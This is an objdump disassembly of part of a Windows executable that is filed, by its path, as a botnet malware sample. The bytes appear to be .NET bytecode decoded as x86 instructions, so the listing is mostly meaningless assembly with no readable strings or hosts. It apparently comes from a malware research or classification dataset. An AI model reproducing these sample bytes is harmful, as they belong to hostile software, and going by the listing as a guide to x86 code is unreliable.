
malware_samples/botnet/a63ed0d601e2702bde64981a66c89fdb33275c6fb22056a1033711e63cf58ea8.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	e0 c9                	loopne 0x401fcb
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 0c 69 00    	add    %al,0x690c00
  402013:	00 9c 60 00 00 01 00 	add    %bl,0x10000(%eax,%eiz,2)
  40201a:	00 00                	add    %al,(%eax)
  40201c:	14 00                	adc    $0x0,%al
  40201e:	00 06                	add    %al,(%esi)
	...
  402050:	1e                   	push   %ds
  402051:	02 28                	add    (%eax),%ch
  402053:	01 00                	add    %eax,(%eax)
  402055:	00 0a                	add    %cl,(%edx)
  402057:	2a 1e                	sub    (%esi),%bl
  402059:	02 28                	add    (%eax),%ch
  40205b:	04 00                	add    $0x0,%al
  40205d:	00 0a                	add    %cl,(%edx)
  40205f:	2a a6 73 06 00 00    	sub    0x673(%esi),%ah
  402065:	0a 80 01 00 00 04    	or     0x4000001(%eax),%al
  40206b:	73 07                	jae    0x402074
  40206d:	00 00                	add    %al,(%eax)
  40206f:	0a 80 02 00 00 04    	or     0x4000002(%eax),%al
  402075:	73 08                	jae    0x40207f
  402077:	00 00                	add    %al,(%eax)
  402079:	0a 80 03 00 00 04    	or     0x4000003(%eax),%al
  40207f:	73 09                	jae    0x40208a
  402081:	00 00                	add    %al,(%eax)
  402083:	0a 80 04 00 00 04    	or     0x4000004(%eax),%al
  402089:	2a 00                	sub    (%eax),%al
  40208b:	00 13                	add    %dl,(%ebx)
  40208d:	30 01                	xor    %al,(%ecx)
  40208f:	00 0f                	add    %cl,(%edi)
  402091:	00 00                	add    %al,(%eax)
  402093:	00 01                	add    %al,(%ecx)
  402095:	00 00                	add    %al,(%eax)
  402097:	11 7e 01             	adc    %edi,0x1(%esi)
  40209a:	00 00                	add    %al,(%eax)
  40209c:	04 6f                	add    $0x6f,%al
  40209e:	0a 00                	or     (%eax),%al
  4020a0:	00 0a                	add    %cl,(%edx)
  4020a2:	0a 2b                	or     (%ebx),%ch
  4020a4:	00 06                	add    %al,(%esi)
  4020a6:	2a 00                	sub    (%eax),%al
  4020a8:	13 30                	adc    (%eax),%esi
  4020aa:	01 00                	add    %eax,(%eax)
  4020ac:	0f 00 00             	sldt   (%eax)
  4020af:	00 02                	add    %al,(%edx)
  4020b1:	00 00                	add    %al,(%eax)
  4020b3:	11 7e 02             	adc    %edi,0x2(%esi)
  4020b6:	00 00                	add    %al,(%eax)
  4020b8:	04 6f                	add    $0x6f,%al
  4020ba:	0b 00                	or     (%eax),%eax
  4020bc:	00 0a                	add    %cl,(%edx)
  4020be:	0a 2b                	or     (%ebx),%ch
  4020c0:	00 06                	add    %al,(%esi)
  4020c2:	2a 00                	sub    (%eax),%al
  4020c4:	13 30                	adc    (%eax),%esi
  4020c6:	01 00                	add    %eax,(%eax)
  4020c8:	0f 00 00             	sldt   (%eax)
  4020cb:	00 03                	add    %al,(%ebx)
  4020cd:	00 00                	add    %al,(%eax)
  4020cf:	11 7e 03             	adc    %edi,0x3(%esi)
  4020d2:	00 00                	add    %al,(%eax)
  4020d4:	04 6f                	add    $0x6f,%al
  4020d6:	0c 00                	or     $0x0,%al
  4020d8:	00 0a                	add    %cl,(%edx)
  4020da:	0a 2b                	or     (%ebx),%ch
  4020dc:	00 06                	add    %al,(%esi)
  4020de:	2a 00                	sub    (%eax),%al
  4020e0:	13 30                	adc    (%eax),%esi
  4020e2:	01 00                	add    %eax,(%eax)
  4020e4:	0f 00 00             	sldt   (%eax)
  4020e7:	00 04 00             	add    %al,(%eax,%eax,1)
  4020ea:	00 11                	add    %dl,(%ecx)
  4020ec:	7e 04                	jle    0x4020f2
  4020ee:	00 00                	add    %al,(%eax)
  4020f0:	04 6f                	add    $0x6f,%al
  4020f2:	0d 00 00 0a 0a       	or     $0xa0a0000,%eax
  4020f7:	2b 00                	sub    (%eax),%eax
  4020f9:	06                   	push   %es
  4020fa:	2a 00                	sub    (%eax),%al
  4020fc:	13 30                	adc    (%eax),%esi
  4020fe:	02 00                	add    (%eax),%al
  402100:	11 00                	adc    %eax,(%eax)
  402102:	00 00                	add    %al,(%eax)
  402104:	05 00 00 11 02       	add    $0x2110000,%eax
  402109:	03 28                	add    (%eax),%ebp
  40210b:	11 00                	adc    %eax,(%eax)
  40210d:	00 0a                	add    %cl,(%edx)
  40210f:	28 12                	sub    %dl,(%edx)
  402111:	00 00                	add    %al,(%eax)
  402113:	0a 0a                	or     (%edx),%cl
  402115:	2b 00                	sub    (%eax),%eax
  402117:	06                   	push   %es
  402118:	2a 00                	sub    (%eax),%al
  40211a:	00 00                	add    %al,(%eax)
  40211c:	13 30                	adc    (%eax),%esi
  40211e:	01 00                	add    %eax,(%eax)
  402120:	0b 00                	or     (%eax),%eax
  402122:	00 00                	add    %al,(%eax)
  402124:	06                   	push   %es
  402125:	00 00                	add    %al,(%eax)
  402127:	11 02                	adc    %eax,(%edx)
  402129:	28 13                	sub    %dl,(%ebx)
  40212b:	00 00                	add    %al,(%eax)
  40212d:	0a 0a                	or     (%edx),%cl
  40212f:	2b 00                	sub    (%eax),%eax
  402131:	06                   	push   %es
  402132:	2a 00                	sub    (%eax),%al
  402134:	13 30                	adc    (%eax),%esi
  402136:	01 00                	add    %eax,(%eax)
  402138:	0f 00 00             	sldt   (%eax)
  40213b:	00 07                	add    %al,(%edi)
  40213d:	00 00                	add    %al,(%eax)
  40213f:	11 d0                	adc    %edx,%eax
  402141:	05 00 00 02 28       	add    $0x28020000,%eax
  402146:	14 00                	adc    $0x0,%al
  402148:	00 0a                	add    %cl,(%edx)
  40214a:	0a 2b                	or     (%ebx),%ch
  40214c:	00 06                	add    %al,(%esi)
  40214e:	2a 00                	sub    (%eax),%al
  402150:	13 30                	adc    (%eax),%esi
  402152:	01 00                	add    %eax,(%eax)
  402154:	0b 00                	or     (%eax),%eax
  402156:	00 00                	add    %al,(%eax)
  402158:	08 00                	or     %al,(%eax)
  40215a:	00 11                	add    %dl,(%ecx)
  40215c:	02 28                	add    (%eax),%ch
  40215e:	15 00 00 0a 0a       	adc    $0xa0a0000,%eax
  402163:	2b 00                	sub    (%eax),%eax
  402165:	06                   	push   %es
  402166:	2a 00                	sub    (%eax),%al
  402168:	13 30                	adc    (%eax),%esi
  40216a:	01 00                	add    %eax,(%eax)
  40216c:	18 00                	sbb    %al,(%eax)
  40216e:	00 00                	add    %al,(%eax)
  402170:	09 00                	or     %eax,(%eax)
  402172:	00 11                	add    %dl,(%ecx)
  402174:	02 8c 01 00 00 1b 2d 	add    0x2d1b0000(%ecx,%eax,1),%cl
  40217b:	0a 28                	or     (%eax),%ch
  40217d:	01 00                	add    %eax,(%eax)
  40217f:	00 2b                	add    %ch,(%ebx)
  402181:	0a 2b                	or     (%ebx),%ch
  402183:	06                   	push   %es
  402184:	2b 04 02             	sub    (%edx,%eax,1),%eax
  402187:	0a 2b                	or     (%ebx),%ch
  402189:	00 06                	add    %al,(%esi)
  40218b:	2a 13                	sub    (%ebx),%dl
  40218d:	30 02                	xor    %al,(%edx)
  40218f:	00 10                	add    %dl,(%eax)
  402191:	00 00                	add    %al,(%eax)
  402193:	00 0a                	add    %cl,(%edx)
  402195:	00 00                	add    %al,(%eax)
  402197:	11 03                	adc    %eax,(%ebx)
  402199:	12 00                	adc    (%eax),%al
  40219b:	fe                   	(bad)
  40219c:	15 02 00 00 1b       	adc    $0x1b000002,%eax
  4021a1:	06                   	push   %es
  4021a2:	81 02 00 00 1b 2a    	addl   $0x2a1b0000,(%edx)
  4021a8:	1e                   	push   %ds
  4021a9:	02 28                	add    (%eax),%ch
  4021ab:	17                   	pop    %ss
  4021ac:	00 00                	add    %al,(%eax)
  4021ae:	0a 2a                	or     (%edx),%ch
  4021b0:	13 30                	adc    (%eax),%esi
  4021b2:	01 00                	add    %eax,(%eax)
  4021b4:	20 00                	and    %al,(%eax)
  4021b6:	00 00                	add    %al,(%eax)
  4021b8:	0b 00                	or     (%eax),%eax
  4021ba:	00 11                	add    %dl,(%ecx)
  4021bc:	7e 19                	jle    0x4021d7
  4021be:	00 00                	add    %al,(%eax)
  4021c0:	0a 8c 03 00 00 1b 2d 	or     0x2d1b0000(%ebx,%eax,1),%cl
  4021c7:	0a 28                	or     (%eax),%ch
  4021c9:	02 00                	add    (%eax),%al
  4021cb:	00 2b                	add    %ch,(%ebx)
  4021cd:	80 19 00             	sbbb   $0x0,(%ecx)
  4021d0:	00 0a                	add    %cl,(%edx)
  4021d2:	7e 19                	jle    0x4021ed
  4021d4:	00 00                	add    %al,(%eax)
  4021d6:	0a 0a                	or     (%edx),%cl
  4021d8:	2b 00                	sub    (%eax),%eax
  4021da:	06                   	push   %es
  4021db:	2a 1e                	sub    (%esi),%bl
  4021dd:	02 28                	add    (%eax),%ch
  4021df:	17                   	pop    %ss
  4021e0:	00 00                	add    %al,(%eax)
  4021e2:	0a 2a                	or     (%edx),%ch
  4021e4:	13 30                	adc    (%eax),%esi
  4021e6:	02 00                	add    (%eax),%al
  4021e8:	83 00 00             	addl   $0x0,(%eax)
  4021eb:	00 00                	add    %al,(%eax)
  4021ed:	00 00                	add    %al,(%eax)
  4021ef:	00 72 01             	add    %dh,0x1(%edx)
  4021f2:	00 00                	add    %al,(%eax)
  4021f4:	70 80                	jo     0x402176
  4021f6:	06                   	push   %es
  4021f7:	00 00                	add    %al,(%eax)
  4021f9:	04 72                	add    $0x72,%al
  4021fb:	5b                   	pop    %ebx
  4021fc:	00 00                	add    %al,(%eax)
  4021fe:	70 80                	jo     0x402180
  402200:	08 00                	or     %al,(%eax)
  402202:	00 04 72             	add    %al,(%edx,%esi,2)
  402205:	8d 00                	lea    (%eax),%eax
  402207:	00 70 80             	add    %dh,-0x80(%eax)
  40220a:	09 00                	or     %eax,(%eax)
  40220c:	00 04 72             	add    %al,(%edx,%esi,2)
  40220f:	bf 00 00 70 80       	mov    $0x80700000,%edi
  402214:	0a 00                	or     (%eax),%al
  402216:	00 04 72             	add    %al,(%edx,%esi,2)
  402219:	f1                   	int1
  40221a:	00 00                	add    %al,(%eax)
  40221c:	70 28                	jo     0x402246
  40221e:	1d 00 00 0a 80       	sbb    $0x800a0000,%eax
  402223:	0b 00                	or     (%eax),%eax
  402225:	00 04 72             	add    %al,(%edx,%esi,2)
  402228:	01 00                	add    %eax,(%eax)
  40222a:	00 70 80             	add    %dh,-0x80(%eax)
  40222d:	0c 00                	or     $0x0,%al
  40222f:	00 04 72             	add    %al,(%edx,%esi,2)
  402232:	f5                   	cmc
  402233:	00 00                	add    %al,(%eax)
  402235:	70 80                	jo     0x4021b7
  402237:	0d 00 00 04 72       	or     $0x72040000,%eax
  40223c:	27                   	daa
  40223d:	01 00                	add    %eax,(%eax)
  40223f:	70 80                	jo     0x4021c1
  402241:	0e                   	push   %cs
  402242:	00 00                	add    %al,(%eax)
  402244:	04 72                	add    $0x72,%al
  402246:	59                   	pop    %ecx
  402247:	01 00                	add    %eax,(%eax)
  402249:	70 80                	jo     0x4021cb
  40224b:	0f 00 00             	sldt   (%eax)
  40224e:	04 72                	add    $0x72,%al
  402250:	8b 01                	mov    (%ecx),%eax
  402252:	00 70 80             	add    %dh,-0x80(%eax)
  402255:	10 00                	adc    %al,(%eax)
  402257:	00 04 72             	add    %al,(%edx,%esi,2)
  40225a:	ad                   	lods   %ds:(%esi),%eax
  40225b:	01 00                	add    %eax,(%eax)
  40225d:	70 28                	jo     0x402287
  40225f:	1e                   	push   %ds
  402260:	00 00                	add    %al,(%eax)
  402262:	0a 72 b7             	or     -0x49(%edx),%dh
  402265:	01 00                	add    %eax,(%eax)
  402267:	70 28                	jo     0x402291
  402269:	1f                   	pop    %ds
  40226a:	00 00                	add    %al,(%eax)
  40226c:	0a 80 11 00 00 04    	or     0x4000011(%eax),%al
  402272:	2a 00                	sub    (%eax),%al
  402274:	1e                   	push   %ds
  402275:	02 28                	add    (%eax),%ch
  402277:	17                   	pop    %ss
  402278:	00 00                	add    %al,(%eax)
  40227a:	0a 2a                	or     (%edx),%ch
  40227c:	1e                   	push   %ds
  40227d:	02 28                	add    (%eax),%ch
  40227f:	17                   	pop    %ss
  402280:	00 00                	add    %al,(%eax)
  402282:	0a 2a                	or     (%edx),%ch
  402284:	1b 30                	sbb    (%eax),%esi
  402286:	09 00                	or     %eax,(%eax)
  402288:	e9 03 00 00 0c       	jmp    0xc402290
  40228d:	00 00                	add    %al,(%eax)
  40228f:	11 7e 0b             	adc    %edi,0xb(%esi)
  402292:	00 00                	add    %al,(%eax)
  402294:	04 20                	add    $0x20,%al
  402296:	e8 03 00 00 d8       	call   0xd840229e
  40229b:	28 22                	sub    %ah,(%edx)
  40229d:	00 00                	add    %al,(%eax)
  40229f:	0a 7e 06             	or     0x6(%esi),%bh
  4022a2:	00 00                	add    %al,(%eax)
  4022a4:	04 28                	add    $0x28,%al
  4022a6:	63 00                	arpl   %eax,(%eax)
  4022a8:	00 06                	add    %al,(%esi)
  4022aa:	28 23                	sub    %ah,(%ebx)
  4022ac:	00 00                	add    %al,(%eax)
  4022ae:	0a 80 06 00 00 04    	or     0x4000006(%eax),%al
  4022b4:	7e 08                	jle    0x4022be
  4022b6:	00 00                	add    %al,(%eax)
  4022b8:	04 28                	add    $0x28,%al
  4022ba:	63 00                	arpl   %eax,(%eax)
  4022bc:	00 06                	add    %al,(%esi)
  4022be:	28 23                	sub    %ah,(%ebx)
  4022c0:	00 00                	add    %al,(%eax)
  4022c2:	0a 80 08 00 00 04    	or     0x4000008(%eax),%al
  4022c8:	7e 09                	jle    0x4022d3
  4022ca:	00 00                	add    %al,(%eax)
  4022cc:	04 28                	add    $0x28,%al
  4022ce:	63 00                	arpl   %eax,(%eax)
  4022d0:	00 06                	add    %al,(%esi)
  4022d2:	28 23                	sub    %ah,(%ebx)
  4022d4:	00 00                	add    %al,(%eax)
  4022d6:	0a 80 09 00 00 04    	or     0x4000009(%eax),%al
  4022dc:	7e 0a                	jle    0x4022e8
  4022de:	00 00                	add    %al,(%eax)
  4022e0:	04 28                	add    $0x28,%al
  4022e2:	63 00                	arpl   %eax,(%eax)
  4022e4:	00 06                	add    %al,(%esi)
  4022e6:	28 23                	sub    %ah,(%ebx)
  4022e8:	00 00                	add    %al,(%eax)
  4022ea:	0a 80 0a 00 00 04    	or     0x400000a(%eax),%al
  4022f0:	7e 0c                	jle    0x4022fe
  4022f2:	00 00                	add    %al,(%eax)
  4022f4:	04 28                	add    $0x28,%al
  4022f6:	63 00                	arpl   %eax,(%eax)
  4022f8:	00 06                	add    %al,(%esi)
  4022fa:	28 23                	sub    %ah,(%ebx)
  4022fc:	00 00                	add    %al,(%eax)
  4022fe:	0a 80 0c 00 00 04    	or     0x400000c(%eax),%al
  402304:	7e 0d                	jle    0x402313
  402306:	00 00                	add    %al,(%eax)
  402308:	04 28                	add    $0x28,%al
  40230a:	63 00                	arpl   %eax,(%eax)
  40230c:	00 06                	add    %al,(%esi)
  40230e:	28 23                	sub    %ah,(%ebx)
  402310:	00 00                	add    %al,(%eax)
  402312:	0a 80 0d 00 00 04    	or     0x400000d(%eax),%al
  402318:	7e 0e                	jle    0x402328
  40231a:	00 00                	add    %al,(%eax)
  40231c:	04 28                	add    $0x28,%al
  40231e:	63 00                	arpl   %eax,(%eax)
  402320:	00 06                	add    %al,(%esi)
  402322:	28 23                	sub    %ah,(%ebx)
  402324:	00 00                	add    %al,(%eax)
  402326:	0a 28                	or     (%eax),%ch
  402328:	24 00                	and    $0x0,%al
  40232a:	00 0a                	add    %cl,(%edx)
  40232c:	80 0e 00             	orb    $0x0,(%esi)
  40232f:	00 04 7e             	add    %al,(%esi,%edi,2)
  402332:	0f 00 00             	sldt   (%eax)
  402335:	04 28                	add    $0x28,%al
  402337:	63 00                	arpl   %eax,(%eax)
  402339:	00 06                	add    %al,(%esi)
  40233b:	28 23                	sub    %ah,(%ebx)
  40233d:	00 00                	add    %al,(%eax)
  40233f:	0a 80 0f 00 00 04    	or     0x400000f(%eax),%al
  402345:	de 14 25 28 25 00 00 	ficoms 0x2528(,%eiz,1)
  40234c:	0a 0d 16 28 26 00    	or     0x262816,%cl
  402352:	00 0a                	add    %cl,(%edx)
  402354:	28 27                	sub    %ah,(%edi)
  402356:	00 00                	add    %al,(%eax)
  402358:	0a de                	or     %dh,%bl
  40235a:	00 28                	add    %ch,(%eax)
  40235c:	7a 00                	jp     0x40235e
  40235e:	00 06                	add    %al,(%esi)
  402360:	2d 06 16 28 26       	sub    $0x26281606,%eax
  402365:	00 00                	add    %al,(%eax)
  402367:	0a 28                	or     (%eax),%ch
  402369:	16                   	push   %ss
  40236a:	00 00                	add    %al,(%eax)
  40236c:	06                   	push   %es
  40236d:	de 0f                	fimuls (%edi)
  40236f:	25 28 25 00 00       	and    $0x2528,%eax
  402374:	0a 13                	or     (%ebx),%dl
  402376:	04 28                	add    $0x28,%al
  402378:	27                   	daa
  402379:	00 00                	add    %al,(%eax)
  40237b:	0a de                	or     %dh,%bl
  40237d:	00 28                	add    %ch,(%eax)
  40237f:	15 00 00 06 7e       	adc    $0x7e060000,%eax
  402384:	0e                   	push   %cs
  402385:	00 00                	add    %al,(%eax)
  402387:	04 72                	add    $0x72,%al
  402389:	c9                   	leave
  40238a:	01 00                	add    %eax,(%eax)
  40238c:	70 7e                	jo     0x40240c
  40238e:	0f 00 00             	sldt   (%eax)
  402391:	04 28                	add    $0x28,%al
  402393:	28 00                	sub    %al,(%eax)
  402395:	00 0a                	add    %cl,(%edx)
  402397:	0a 06                	or     (%esi),%al
  402399:	73 29                	jae    0x4023c4
  40239b:	00 00                	add    %al,(%eax)
  40239d:	0a 6f 2a             	or     0x2a(%edi),%ch
  4023a0:	00 00                	add    %al,(%eax)
  4023a2:	0a 6f 2b             	or     0x2b(%edi),%ch
  4023a5:	00 00                	add    %al,(%eax)
  4023a7:	0a 13                	or     (%ebx),%dl
  4023a9:	05 11 05 28 23       	add    $0x23280511,%eax
  4023ae:	00 00                	add    %al,(%eax)
  4023b0:	0a 28                	or     (%eax),%ch
  4023b2:	2c 00                	sub    $0x0,%al
  4023b4:	00 0a                	add    %cl,(%edx)
  4023b6:	2d 0d 11 05 28       	sub    $0x2805110d,%eax
  4023bb:	23 00                	and    (%eax),%eax
  4023bd:	00 0a                	add    %cl,(%edx)
  4023bf:	28 2d 00 00 0a 26    	sub    %ch,0x260a0000
  4023c5:	06                   	push   %es
  4023c6:	28 2e                	sub    %ch,(%esi)
  4023c8:	00 00                	add    %al,(%eax)
  4023ca:	0a 2c 0f             	or     (%edi,%ecx,1),%ch
  4023cd:	06                   	push   %es
  4023ce:	73 29                	jae    0x4023f9
  4023d0:	00 00                	add    %al,(%eax)
  4023d2:	0a 13                	or     (%ebx),%dl
  4023d4:	06                   	push   %es
  4023d5:	11 06                	adc    %eax,(%esi)
  4023d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4023d8:	2f                   	das
  4023d9:	00 00                	add    %al,(%eax)
  4023db:	0a 20                	or     (%eax),%ah
  4023dd:	e8 03 00 00 28       	call   0x284023e5
  4023e2:	22 00                	and    (%eax),%al
  4023e4:	00 0a                	add    %cl,(%edx)
  4023e6:	06                   	push   %es
  4023e7:	7e 2d                	jle    0x402416
  4023e9:	00 00                	add    %al,(%eax)
  4023eb:	04 28                	add    $0x28,%al
  4023ed:	30 00                	xor    %al,(%eax)
  4023ef:	00 0a                	add    %cl,(%edx)
  4023f1:	28 31                	sub    %dh,(%ecx)
  4023f3:	00 00                	add    %al,(%eax)
  4023f5:	0a de                	or     %dh,%bl
  4023f7:	0f 25                	(bad)
  4023f9:	28 25 00 00 0a 13    	sub    %ah,0x130a0000
  4023ff:	07                   	pop    %es
  402400:	28 27                	sub    %ah,(%edi)
  402402:	00 00                	add    %al,(%eax)
  402404:	0a de                	or     %dh,%bl
  402406:	00 72 cd             	add    %dh,-0x33(%edx)
  402409:	01 00                	add    %eax,(%eax)
  40240b:	70 73                	jo     0x402480
  40240d:	32 00                	xor    (%eax),%al
  40240f:	00 0a                	add    %cl,(%edx)
  402411:	13 09                	adc    (%ecx),%ecx
  402413:	11 09                	adc    %ecx,(%ecx)
  402415:	17                   	pop    %ss
  402416:	6f                   	outsl  %ds:(%esi),(%dx)
  402417:	33 00                	xor    (%eax),%eax
  402419:	00 0a                	add    %cl,(%edx)
  40241b:	28 28                	sub    %ch,(%eax)
  40241d:	00 00                	add    %al,(%eax)
  40241f:	06                   	push   %es
  402420:	28 34 00             	sub    %dh,(%eax,%eax,1)
  402423:	00 0a                	add    %cl,(%edx)
  402425:	2c 46                	sub    $0x46,%al
  402427:	11 09                	adc    %ecx,(%ecx)
  402429:	1b 8d 26 00 00 01    	sbb    0x1000026(%ebp),%ecx
  40242f:	13 0e                	adc    (%esi),%ecx
  402431:	11 0e                	adc    %ecx,(%esi)
  402433:	16                   	push   %ss
  402434:	72 e7                	jb     0x40241d
  402436:	01 00                	add    %eax,(%eax)
  402438:	70 a2                	jo     0x4023dc
  40243a:	11 0e                	adc    %ecx,(%esi)
  40243c:	17                   	pop    %ss
  40243d:	7e 0f                	jle    0x40244e
  40243f:	00 00                	add    %al,(%eax)
  402441:	04 28                	add    $0x28,%al
  402443:	35 00 00 0a a2       	xor    $0xa20a0000,%eax
  402448:	11 0e                	adc    %ecx,(%esi)
  40244a:	18 72 43             	sbb    %dh,0x43(%edx)
  40244d:	02 00                	add    (%eax),%al
  40244f:	70 a2                	jo     0x4023f3
  402451:	11 0e                	adc    %ecx,(%esi)
  402453:	19 06                	sbb    %eax,(%esi)
  402455:	a2 11 0e 1a 72       	mov    %al,0x721a0e11
  40245a:	53                   	push   %ebx
  40245b:	02 00                	add    (%eax),%al
  40245d:	70 a2                	jo     0x402401
  40245f:	11 0e                	adc    %ecx,(%esi)
  402461:	28 36                	sub    %dh,(%esi)
  402463:	00 00                	add    %al,(%eax)
  402465:	0a 6f 37             	or     0x37(%edi),%ch
  402468:	00 00                	add    %al,(%eax)
  40246a:	0a 2b                	or     (%ebx),%ch
  40246c:	44                   	inc    %esp
  40246d:	11 09                	adc    %ecx,(%ecx)
  40246f:	1b 8d 26 00 00 01    	sbb    0x1000026(%ebp),%ecx
  402475:	13 0e                	adc    (%esi),%ecx
  402477:	11 0e                	adc    %ecx,(%esi)
  402479:	16                   	push   %ss
  40247a:	72 57                	jb     0x4024d3
  40247c:	02 00                	add    (%eax),%al
  40247e:	70 a2                	jo     0x402422
  402480:	11 0e                	adc    %ecx,(%esi)
  402482:	17                   	pop    %ss
  402483:	7e 0f                	jle    0x402494
  402485:	00 00                	add    %al,(%eax)
  402487:	04 28                	add    $0x28,%al
  402489:	35 00 00 0a a2       	xor    $0xa20a0000,%eax
  40248e:	11 0e                	adc    %ecx,(%esi)
  402490:	18 72 43             	sbb    %dh,0x43(%edx)
  402493:	02 00                	add    (%eax),%al
  402495:	70 a2                	jo     0x402439
  402497:	11 0e                	adc    %ecx,(%esi)
  402499:	19 06                	sbb    %eax,(%esi)
  40249b:	a2 11 0e 1a 72       	mov    %al,0x721a0e11
  4024a0:	53                   	push   %ebx
  4024a1:	02 00                	add    (%eax),%al
  4024a3:	70 a2                	jo     0x402447
  4024a5:	11 0e                	adc    %ecx,(%esi)
  4024a7:	28 36                	sub    %dh,(%esi)
  4024a9:	00 00                	add    %al,(%eax)
  4024ab:	0a 6f 37             	or     0x37(%edi),%ch
  4024ae:	00 00                	add    %al,(%eax)
  4024b0:	0a 11                	or     (%ecx),%dl
  4024b2:	09 28                	or     %ebp,(%eax)
  4024b4:	38 00                	cmp    %al,(%eax)
  4024b6:	00 0a                	add    %cl,(%edx)
  4024b8:	13 08                	adc    (%eax),%ecx
  4024ba:	11 08                	adc    %ecx,(%eax)
  4024bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4024bd:	39 00                	cmp    %eax,(%eax)
  4024bf:	00 0a                	add    %cl,(%edx)
  4024c1:	de 0f                	fimuls (%edi)
  4024c3:	25 28 25 00 00       	and    $0x2528,%eax
  4024c8:	0a 13                	or     (%ebx),%dl
  4024ca:	0a 28                	or     (%eax),%ch
  4024cc:	27                   	daa
  4024cd:	00 00                	add    %al,(%eax)
  4024cf:	0a de                	or     %dh,%bl
  4024d1:	00 28                	add    %ch,(%eax)
  4024d3:	04 00                	add    $0x0,%al
  4024d5:	00 06                	add    %al,(%esi)
  4024d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4024d8:	3a 00                	cmp    (%eax),%al
  4024da:	00 0a                	add    %cl,(%edx)
  4024dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4024dd:	3b 00                	cmp    (%eax),%eax
  4024df:	00 0a                	add    %cl,(%edx)
  4024e1:	72 9b                	jb     0x40247e
  4024e3:	02 00                	add    (%eax),%al
  4024e5:	70 17                	jo     0x4024fe
  4024e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4024e8:	3c 00                	cmp    $0x0,%al
  4024ea:	00 0a                	add    %cl,(%edx)
  4024ec:	7e 0f                	jle    0x4024fd
  4024ee:	00 00                	add    %al,(%eax)
  4024f0:	04 28                	add    $0x28,%al
  4024f2:	35 00 00 0a 06       	xor    $0x60a0000,%eax
  4024f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4024f8:	3d 00 00 0a de       	cmp    $0xde0a0000,%eax
  4024fd:	0f 25                	(bad)
  4024ff:	28 25 00 00 0a 13    	sub    %ah,0x130a0000
  402505:	0b 28                	or     (%eax),%ebp
  402507:	27                   	daa
  402508:	00 00                	add    %al,(%eax)
  40250a:	0a de                	or     %dh,%bl
  40250c:	00 1d 28 3e 00 00    	add    %bl,0x3e28
  402512:	0a 72 c9             	or     -0x37(%edx),%dh
  402515:	01 00                	add    %eax,(%eax)
  402517:	70 7e                	jo     0x402597
  402519:	0f 00 00             	sldt   (%eax)
  40251c:	04 28                	add    $0x28,%al
  40251e:	35 00 00 0a 72       	xor    $0x720a0000,%eax
  402523:	f7 02 00 70 28 3f    	testl  $0x3f287000,(%edx)
  402529:	00 00                	add    %al,(%eax)
  40252b:	0a 13                	or     (%ebx),%dl
  40252d:	0c 72                	or     $0x72,%al
  40252f:	01 03                	add    %eax,(%ebx)
  402531:	00 70 72             	add    %dh,0x72(%eax)
  402534:	1d 03 00 70 28       	sbb    $0x28700003,%eax
  402539:	40                   	inc    %eax
  40253a:	00 00                	add    %al,(%eax)
  40253c:	0a 14 72             	or     (%edx,%esi,2),%dl
  40253f:	1f                   	pop    %ds
  402540:	03 00                	add    (%eax),%eax
  402542:	70 17                	jo     0x40255b
  402544:	8d 03                	lea    (%ebx),%eax
  402546:	00 00                	add    %al,(%eax)
  402548:	01 13                	add    %edx,(%ebx)
  40254a:	0f 11 0f             	movups %xmm1,(%edi)
  40254d:	16                   	push   %ss
  40254e:	11 0c a2             	adc    %ecx,(%edx,%eiz,4)
  402551:	11 0f                	adc    %ecx,(%edi)
  402553:	13 10                	adc    (%eax),%edx
  402555:	11 10                	adc    %edx,(%eax)
  402557:	14 14                	adc    $0x14,%al
  402559:	17                   	pop    %ss
  40255a:	8d 38                	lea    (%eax),%edi
  40255c:	00 00                	add    %al,(%eax)
  40255e:	01 13                	add    %edx,(%ebx)
  402560:	11 11                	adc    %edx,(%ecx)
  402562:	11 16                	adc    %edx,(%esi)
  402564:	17                   	pop    %ss
  402565:	9c                   	pushf
  402566:	11 11                	adc    %edx,(%ecx)
  402568:	28 41 00             	sub    %al,0x0(%ecx)
  40256b:	00 0a                	add    %cl,(%edx)
  40256d:	11 11                	adc    %edx,(%ecx)
  40256f:	16                   	push   %ss
  402570:	90                   	nop
  402571:	2c 1f                	sub    $0x1f,%al
  402573:	11 10                	adc    %edx,(%eax)
  402575:	16                   	push   %ss
  402576:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  40257d:	26 00 00             	add    %al,%es:(%eax)
  402580:	01 28                	add    %ebp,(%eax)
  402582:	14 00                	adc    $0x0,%al
  402584:	00 0a                	add    %cl,(%edx)
  402586:	28 42 00             	sub    %al,0x0(%edx)
  402589:	00 0a                	add    %cl,(%edx)
  40258b:	74 26                	je     0x4025b3
  40258d:	00 00                	add    %al,(%eax)
  40258f:	01 13                	add    %edx,(%ebx)
  402591:	0c 13                	or     $0x13,%al
  402593:	12 11                	adc    (%ecx),%dl
  402595:	12 14 72             	adc    (%edx,%esi,2),%dl
  402598:	3d 03 00 70 17       	cmp    $0x17700003,%eax
  40259d:	8d 03                	lea    (%ebx),%eax
  40259f:	00 00                	add    %al,(%eax)
  4025a1:	01 13                	add    %edx,(%ebx)
  4025a3:	13 11                	adc    (%ecx),%edx
  4025a5:	13 16                	adc    (%esi),%edx
  4025a7:	06                   	push   %es
  4025a8:	a2 11 13 14 14       	mov    %al,0x14141311
  4025ad:	16                   	push   %ss
  4025ae:	17                   	pop    %ss
  4025af:	28 43 00             	sub    %al,0x0(%ebx)
  4025b2:	00 0a                	add    %cl,(%edx)
  4025b4:	11 12                	adc    %edx,(%edx)
  4025b6:	14 72                	adc    $0x72,%al
  4025b8:	53                   	push   %ebx
  4025b9:	03 00                	add    (%eax),%eax
  4025bb:	70 17                	jo     0x4025d4
  4025bd:	8d 03                	lea    (%ebx),%eax
  4025bf:	00 00                	add    %al,(%eax)
  4025c1:	01 13                	add    %edx,(%ebx)
  4025c3:	13 11                	adc    (%ecx),%edx
  4025c5:	13 16                	adc    (%esi),%edx
  4025c7:	72 1d                	jb     0x4025e6
  4025c9:	03 00                	add    (%eax),%eax
